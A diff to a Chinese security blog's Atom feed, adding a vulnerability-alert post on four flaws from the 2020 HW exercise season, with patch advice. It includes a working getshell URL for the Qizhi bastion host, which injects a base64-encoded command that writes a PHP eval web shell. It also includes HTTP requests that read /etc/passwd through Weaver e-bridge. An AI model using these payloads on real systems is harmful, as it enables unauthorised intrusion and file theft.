@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://yejinpoxiao.xyz/"/>
-  <updated>2020-09-11T11:18:27.479Z</updated>
+  <updated>2020-09-12T18:06:38.972Z</updated>
   <id>https://yejinpoxiao.xyz/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>2020HW第二弹</title>
+    <link href="https://yejinpoxiao.xyz/2020/09/13/2020HW%E7%AC%AC%E4%BA%8C%E5%BC%B9/"/>
+    <id>https://yejinpoxiao.xyz/2020/09/13/2020HW%E7%AC%AC%E4%BA%8C%E5%BC%B9/</id>
+    <published>2020-09-12T17:35:26.051Z</published>
+    <updated>2020-09-12T18:06:38.972Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="PAN-OS远程代码执行漏洞（CVE-2020-2040）"><a href="#PAN-OS远程代码执行漏洞（CVE-2020-2040）" class="headerlink" title="PAN-OS远程代码执行漏洞（CVE-2020-2040）"></a>PAN-OS远程代码执行漏洞（CVE-2020-2040）</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>PAN-OS是一个运行在Palo Alto Networks防火墙和企业VPN设备上的操作系统。近日PAN-OS被曝出存在远程代码执行漏洞。</p><p>该漏洞是PAN-OS上的一个缓冲区溢出漏洞，当启用了强制门户或配置了多重身份验证（MFA）时，未经身份验证的攻击者可通过向Captive Portal或Multi-Factor  Authentication接口发送恶意请求进行利用，可能导致系统进程中断，并允许使用root特权在PAN-OS设备上执行任意代码。</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>目前官方已针对此漏洞发布了更新版本，请受影响的用户尽快升级至安全版本进行防护，官方更新指南：</p><p><a href="https://docs.paloaltonetworks.com/pan-os/10-0/pan-os-admin/software-and-content-updates/pan-os-software-updates.html" target="_blank" rel="noopener">https://docs.paloaltonetworks.com/pan-os/10-0/pan-os-admin/software-and-content-updates/pan-os-software-updates.html</a></p><h2 id="齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）"><a href="#齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）" class="headerlink" title="齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）"></a>齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>无需登录</p><p>利用过程:</p><p>　　第一，<a href="http://10.20.10.11/listener/cluster_manage.php返回“OK”。" target="_blank" rel="noopener">http://10.20.10.11/listener/cluster_manage.php返回“OK”。</a></p><p>　　第二，执行以下链接即可getshell，执行成功后，生成PHP一句话马/var/www/shterm/resources/qrcode/lbj77.php密码10086。这里假设10.20.10.10为堡垒机的IP地址。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://10.20.10.10/ha_request.php?action=install&amp;ipaddr=10.20.10.11&amp;node_id=1$&#123;IFS&#125;|`echo$&#123;IFS&#125;"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64$&#123;IFS&#125;-d|bash`|$&#123;IFS&#125;|echo$&#123;IFS&#125;</span><br></pre></td></tr></table></figure><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>　　$node_id的看起来应该是一个整数，所以只需在ha_request.php文件开头，添加以下一行代码，对该变量进行过滤即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　$node_id = @intval($req_node_id);</span><br></pre></td></tr></table></figure><h2 id="泛微云桥任意文件读取漏洞"><a href="#泛微云桥任意文件读取漏洞" class="headerlink" title="泛微云桥任意文件读取漏洞"></a>泛微云桥任意文件读取漏洞</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>泛微云桥是一个为了满足用户提出的阿里钉钉与泛微OA集成需求,近日,泛微与阿里钉钉工程师多方联合,集合内部研发力量共同完成的“泛微云桥e-bridge平台”，近日泛微云桥被曝出存在任意文件读取漏洞。</p><h3 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h3><p>　　该漏洞几乎影响2018-2019全版本。</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: curl/7.29.0</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br></pre></td></tr></table></figure><p><img src="0.png" alt="0"></p><p>将相应包中的id提交</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/file/fileNoLogin/xxxxxxxxxx</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: curl/7.29.0</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br></pre></td></tr></table></figure><p><img src="1.png" alt="1"></p><h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>去官网更新最新版本。</p><h2 id="网瑞达webVPN-RCE漏洞"><a href="#网瑞达webVPN-RCE漏洞" class="headerlink" title="网瑞达webVPN RCE漏洞"></a>网瑞达webVPN RCE漏洞</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>WebVPN是提供基于web的内网应用访问控制，允许授权用户访问只对内网开放的web应用，实现类似VPN（虚拟专用网）的功能。近日网瑞达的webVPN被曝出存在RCE的漏洞。</p><h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><p>去官网更新最新版本</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;PAN-OS远程代码执行漏洞（CVE-2020-2040）&quot;&gt;&lt;a href=&quot;#PAN-OS远程代码执行漏洞（CVE-2020-2040）&quot; class=&quot;headerlink&quot; title=&quot;PAN-OS远程代码执行漏洞（CVE-2020-2040）&quot;&gt;&lt;/a
+      
+    
+    </summary>
+    
+    
+      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
+    
+    
+      <category term="告警信息" scheme="https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"/>
+    
+  </entry>
   
   <entry>
     <title>phpstudy默认配置nginx存在解析漏洞</title>
